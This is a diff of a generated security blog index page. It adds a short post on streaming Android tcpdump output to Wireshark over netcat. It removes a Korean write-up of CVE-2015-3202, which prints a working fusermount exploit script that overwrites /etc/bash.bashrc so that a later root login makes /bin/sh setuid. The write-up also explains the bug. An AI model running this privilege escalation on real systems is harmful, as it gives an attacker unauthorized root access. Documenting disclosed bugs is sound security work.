@@ -9,22 +9,12 @@
   <meta name="author" content="KC">
 
   
-  <meta name="description" content="Cydia BigBoss Recommended Tools otool 1
+  <meta name="description" content="1
 2
 3
-4
-5
-6
-7
-8
-9
-10
-11
-12
-13
-14
-# Inspect the Objective-C segment to reveal class and method names:
-$ otool - &hellip;">
+$ adb shell "tcpdump -s 0 -w - | nc -l -p 4444"
+$ adb forward tcp:4444 tcp:4444
+$ nc localhost 4444 | sudo wireshark -k -S -i - ">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -80,6 +70,41 @@ $ otool - &hellip;">
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2015/06/04/using-wireshark-with-android/">Using Wireshark With Android</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2015-06-04T13:49:09+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>4</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>1:49 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ adb shell "tcpdump -s 0 -w - | nc -l -p 4444"
+</span><span class='line'>$ adb forward tcp:4444 tcp:4444
+</span><span class='line'>$ nc localhost 4444 | sudo wireshark -k -S -i -</span></code></pre></td></tr></table></div></figure>
+
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1281,109 +1306,6 @@ UID 는 코프로세서 밖으로 추출이 불가능하기때문에, 해당 아
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2015/05/22/cve-2015-3202-fusermount/">CVE-2015-3202: Fusermount</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-<time class='entry-date' datetime='2015-05-22T23:07:55+09:00'><span class='date'><span class='date-month'>May</span> <span class='date-day'>22</span><span class='date-suffix'>nd</span>, <span class='date-year'>2015</span></span> <span class='time'>11:07 pm</span></time>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>Tavis Ormandy 가 데비안/우분투에서 root 를 얻는 버그를 공개했다.</p>
-
-<p><a href="https://gist.github.com/taviso/ecb70eb12d461dd85cba">gist</a></p>
-
-<p>Twitter 에 올릴라고 140 자로 압축한 exploit 을 풀어봤다.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>z@ubuntu:~$ cat babo.sh
-</span><span class='line'>echo "chmod 4755 /bin/sh" &gt; /tmp/babo
-</span><span class='line'>chmod 755 /tmp/babo
-</span><span class='line'>mkdir -p /tmp/babo\;/tmp/babo
-</span><span class='line'>LIBMOUNT_MTAB=/etc/bash.bashrc _FUSE_COMMFD=0 fusermount /tmp/babo\;/tmp/babo</span></code></pre></td></tr></table></div></figure>
-
-
-<p>이 간단한 스크립트를 실행해본다.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>z@ubuntu:~$ ./babo.sh
-</span><span class='line'>fusermount: failed to open /etc/fuse.conf: Permission denied
-</span><span class='line'>sending file descriptor: Socket operation on non-socket
-</span><span class='line'>z@ubuntu:~$ cat /etc/bash.bashrc
-</span><span class='line'>/dev/fuse /tmp/.6960;/tmp/.6960 fuse rw,nosuid,nodev,user=z 0 0</span></code></pre></td></tr></table></div></figure>
-
-
-<p>이제 관리자가 sudo 나 root login 하기를 기다린다.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>z@ubuntu:~$ sudo -s
-</span><span class='line'>bash: /dev/fuse: Permission denied
-</span><span class='line'>root@ubuntu:~# exit
-</span><span class='line'>exit
-</span><span class='line'>z@ubuntu:~$ ls -lL /bin/sh
-</span><span class='line'>-rwsr-xr-x 1 root root 121272 Feb 10    2014 /bin/sh
-</span><span class='line'>z@ubuntu:~$</span></code></pre></td></tr></table></div></figure>
-
-
-<p>저 스크립트를 돌리면</p>
-
-<ol>
-<li>fusermount 가 바보같이 /etc/bash.bashrc 에다가 마운트 테이블을 overwrite 하는데,</li>
-<li>나중에 root 가 로그인할때 /etc/bash.bashrc 가 수행되면서, (sudo -s)</li>
-<li>/tmp/.6960 이 수행되고</li>
-<li>chmod 4755 /bin/sh 이 수행되면서</li>
-<li>setuid 쉘이 만들어지는 결과</li>
-</ol>
-
-
-<p>가 나오는 것으로 보인다.</p>
-
-<p>핵심은 1 번 버그인 것 같은데,</p>
-
-<ol>
-<li>fusermount 가 setuid 되어있다.</li>
-<li>fusermount 가 /bin/mount 를 부를때 (setuid(geteuid()) 를 해서 ruid 를 0 를 만든다)</li>
-<li>mount 는 root 가 불렀다고 착각한다. (fusermount 입장에서는 의도된 것이긴 하지만, mount 입장에서는 속은 것)</li>
-<li>이제 mount 디버깅용 환경 변수가 먹힌다. (LIBMOUNT_MTAB)</li>
-<li>이제 마운트 테이블로 어떤 화일이든 overwrite 할 수 있다.</li>
-</ol>
-
-
-<p>sudo 쳐주기를 기다려야한다는 점에서, 실전에서 유용성은 많이 떨어진다고 본다.</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
     
       <a class="prev" href="/posts/9">&larr; Older</a>
@@ -1401,6 +1323,10 @@ UID 는 코프로세서 밖으로 추출이 불가능하기때문에, 해당 아
   <ul id="recent_posts">
     
       <li class="post">
+        <a href="/blog/2016/06/17/cve-2016-0728/">CVE-2016-0728</a>
+      </li>
+    
+      <li class="post">
         <a href="/blog/2016/06/14/the-poisoned-nul-byte/">The Poisoned NUL Byte</a>
       </li>
     
@@ -1414,10 +1340,6 @@ UID 는 코프로세서 밖으로 추출이 불가능하기때문에, 해당 아
     
       <li class="post">
         <a href="/blog/2016/06/14/glibc-adventures-the-forgotten-chunks/">Glibc Adventures: The Forgotten Chunks</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2016/06/13/poison-null-byte/">Poison NULL Byte</a>
       </li>
     
   </ul>
